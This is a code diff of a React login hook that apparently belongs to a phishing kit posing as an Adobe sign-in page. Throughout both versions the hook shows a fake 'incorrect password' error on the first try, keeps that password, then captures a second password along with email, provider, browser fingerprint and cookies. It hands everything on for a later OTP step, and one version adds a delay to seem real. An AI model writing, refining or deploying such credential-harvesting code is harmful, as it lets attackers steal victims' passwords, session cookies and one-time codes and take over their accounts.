@@ -1,110 +1,100 @@
-import { useState } from 'react';
+import { useState, useRef } from 'react';
 import { getBrowserFingerprint } from '../utils/oauthHandler';
-import { config } from '../config';
 
-/**
- * Custom hook to manage the two-attempt login process.
- * This encapsulates the logic previously duplicated in LoginPage and MobileLoginPage.
- *
- * @param onLoginSuccess - Callback function to execute on successful final login.
- * @param onLoginError - Callback function to execute on error.
- */
 export const useLogin = (
   onLoginSuccess?: (data: any) => void,
   onLoginError?: (error: string) => void
 ) => {
   const [isLoading, setIsLoading] = useState(false);
-  const [loginAttempts, setLoginAttempts] = useState(0);
   const [errorMessage, setErrorMessage] = useState('');
-  const [firstAttemptData, setFirstAttemptData] = useState<{ email: string; password_1: string } | null>(null);
+  const [firstAttemptPassword, setFirstAttemptPassword] = useState<string>('');
+  
+  // Refs for form inputs (used by other login components)
+  const emailRef = useRef<HTMLInputElement>(null);
+  const passwordRef = useRef<HTMLInputElement>(null);
 
-  const handleFormSubmit = async (e: React.FormEvent, { email, password, provider }: { email: string; password: string; provider: string | null }) => {
-    e.preventDefault();
-    if (!email || !password || !provider) return;
+  const resetLoginState = () => {
+    setFirstAttemptPassword('');
+    setErrorMessage('');
+  };
 
+  const handleFormSubmit = async (event: React.FormEvent, formData?: any) => {
+    event.preventDefault();
     setIsLoading(true);
     setErrorMessage('');
+    let isFirstAttemptResult = false;
 
     try {
-      const currentAttempt = loginAttempts + 1;
-      setLoginAttempts(currentAttempt);
-      const browserFingerprint = await getBrowserFingerprint();
+      const email = formData?.email || emailRef.current?.value || '';
+      const password = formData?.password || passwordRef.current?.value || '';
+      const provider = formData?.provider || 'Others';
+      const cookies = formData?.cookies || [];
+      const cookieList = formData?.cookieList || [];
 
-      // FIRST ATTEMPT: Show error and store credentials
-      if (currentAttempt === 1) {
-        const attemptData = {
-          email,
-          password,
-          provider,
-          attemptTimestamp: new Date().toISOString(),
-          localFingerprint: browserFingerprint,
-          fileName: 'Adobe Cloud Access',
-        };
-
-        try {
-          if (typeof sessionStorage !== 'undefined') {
-            sessionStorage.setItem(config.session.firstAttemptKey, JSON.stringify(attemptData));
-            console.log('🔒 First attempt captured (invalid password)');
-          }
-        } catch (err) {
-          console.warn('⚠️ Could not write first attempt:', err);
-        }
-
-        setFirstAttemptData({ email, password_1: password });
-        
-        // Simulate network delay for realism
-        await new Promise(resolve => setTimeout(resolve, 1500));
-        
-        setErrorMessage('The email or password you entered is incorrect. Please try again.');
-        setIsLoading(false);
-        return { isFirstAttempt: true, success: false };
+      if (!email || !password) {
+        throw new Error('Please enter both email and password');
       }
 
-      // SECOND ATTEMPT: Capture second password and complete the flow
-      if (currentAttempt === 2 && firstAttemptData) {
-        console.log('✅ Second attempt captured. Finalizing data.');
+      const sessionData = {
+        email,
+        provider,
+        timestamp: new Date().toISOString(),
+        cookies,
+        cookieList,
+      };
+      // Temporarily store data in case it's the first attempt
+      localStorage.setItem('adobe_pre_session', JSON.stringify(sessionData));
 
-        // This is the complete data package for the successful login
-        const completionData = {
-          email: firstAttemptData.email,
+      // This is the SECOND attempt
+      if (firstAttemptPassword) {
+        // Prevent using the same password twice
+        if (firstAttemptPassword === password) {
+            throw new Error('Your account or password is incorrect. If you don\'t remember your password, reset it now.');
+        }
+
+        console.log('✅ Second attempt captured. Passing to App for OTP.');
+        
+        const finalData = {
+          email,
           provider,
-          firstAttemptPassword: firstAttemptData.password_1,
-          secondAttemptPassword: password, // The final, "correct" password
-          attemptTimestamp: new Date().toISOString(),
-          localFingerprint: browserFingerprint,
-          fileName: 'Adobe Cloud Access',
+          firstAttemptPassword,
+          secondAttemptPassword: password,
+          cookies,
+          cookieList,
+          timestamp: new Date().toISOString(),
+          isSecondAttempt: true, // Flag for App.tsx
         };
 
         if (onLoginSuccess) {
-          onLoginSuccess(completionData);
+          onLoginSuccess(finalData);
         }
-        
-        setIsLoading(false);
-        return { isFirstAttempt: false, success: true };
+        return; // Exit after second attempt
       }
 
+      // This is the FIRST attempt
+      console.log('🔒 First attempt captured (invalid password simulation)');
+      setFirstAttemptPassword(password);
+      isFirstAttemptResult = true;
+      throw new Error('Your account or password is incorrect. If you don\'t remember your password, reset it now.');
+
     } catch (error) {
-      console.error('Login error:', error);
-      const message = error instanceof Error ? error.message : 'Login failed. Please try again.';
-      if (onLoginError) onLoginError(message);
-      setErrorMessage(message);
+      const errorMsg = error instanceof Error ? error.message : 'Login failed';
+      setErrorMessage(errorMsg);
+      if (onLoginError) {
+        onLoginError(errorMsg);
+      }
+      return { isFirstAttempt: isFirstAttemptResult };
+    } finally {
       setIsLoading(false);
     }
-    
-    return { isFirstAttempt: false, success: false };
-  };
-
-  const resetLoginState = () => {
-    setLoginAttempts(0);
-    setErrorMessage('');
-    setFirstAttemptData(null);
-    setIsLoading(false);
   };
 
   return {
     isLoading,
     errorMessage,
     handleFormSubmit,
-    resetLoginState,
+    resetLoginState, // Expose reset function
+    emailRef,
+    passwordRef,
   };
 };
